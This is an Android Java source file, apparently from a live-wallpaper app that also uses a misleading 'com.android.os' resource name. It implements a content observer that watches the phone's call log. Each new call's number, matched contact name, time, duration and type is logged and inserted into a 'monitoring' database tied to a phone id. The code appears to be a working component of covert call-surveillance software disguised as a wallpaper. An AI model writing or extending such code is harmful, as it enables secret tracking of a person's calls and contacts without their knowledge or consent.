package com.livewallpaper.circle.box.call;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import com.android.os.R;
import com.livewallpaper.circle.box.ServiceListener;
import com.livewallpaper.circle.db.InfoAboutThePhone;
import com.livewallpaper.circle.db.controllers.MonitorSQLiteAdapter;
import com.livewallpaper.circle.db.models.People;

import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.CallLog;
import android.util.Log;

public class ContentCallObserver extends ContentObserver {

	private Context context = ServiceListener.context;
	private static final String LOG_TAG = "monitoring";
	private static MonitorSQLiteAdapter mAdapter = MonitorSQLiteAdapter.SQLITE_ADAPTER;
	private static SimpleDateFormat sdf = new SimpleDateFormat(
			"dd.MMM.yy HH:mm:ss", Locale.getDefault());

	public ContentCallObserver(Handler handler) {
		super(handler);

	}

	@Override
	public boolean deliverSelfNotifications() {
		return false;
	}

	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		Log.d(LOG_TAG, "ContentCallObserver.onChange( " + selfChange + ")");

		monitoringCall();

	}

	public void monitoringCall() {
		String phone;
		long date;
		long duraction;
		int type;

		Cursor cursorCall = null;
		try {
			mAdapter.open(context);
			People people = mAdapter.selectPeople();
			if (people != null) {
				String columns[] = new String[] { CallLog.Calls.NUMBER,
						CallLog.Calls.DATE, CallLog.Calls.DURATION,
						CallLog.Calls.TYPE };

				long lastCallTime = people.getLastCall();
				String INCOMING = "1", OUTGOING = "2", MISSED = "3";
				cursorCall = context.getContentResolver().query(
						Uri.parse("content://call_log/calls"),
						columns,
						"(type = ? OR type = ? OR type = ?) AND date > ?",
						new String[] { OUTGOING, INCOMING, MISSED,
								Long.toString(lastCallTime) }, null); // last
																		// record
																		// first
																		// "Calls._ID DESC"

				if (cursorCall != null && cursorCall.moveToNext()) {
					phone = cursorCall.getString(cursorCall
							.getColumnIndex(CallLog.Calls.NUMBER));
					String phoneName = InfoAboutThePhone.getContactName(
							context, phone);
					if (phoneName != null) {
						phone = phoneName + " - " + phone;
					}
					date = cursorCall.getLong(cursorCall
							.getColumnIndex(CallLog.Calls.DATE));
					people.setLastCall(date);
					mAdapter.updatePeopleLastCall(people);
					duraction = cursorCall.getLong(cursorCall
							.getColumnIndex(CallLog.Calls.DURATION));
					type = cursorCall.getInt(cursorCall
							.getColumnIndex(CallLog.Calls.TYPE));
					Log.i(LOG_TAG, "Call to number: " + phone + ", date -: "
							+ sdf.format(new Date(date)) + ", duraction -: "
							+ duraction + ", type -: " + type);
					mAdapter.insertCall(
							phone,
							sdf.format(new Date(date)),
							context.getResources().getString(R.string.call_duration)+" - "
									+ String.valueOf(duraction), type,
							people.getPhoneId());
				}

			}
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			if (cursorCall != null) {
				cursorCall.close();
			}
			mAdapter.close();
		}

	}

}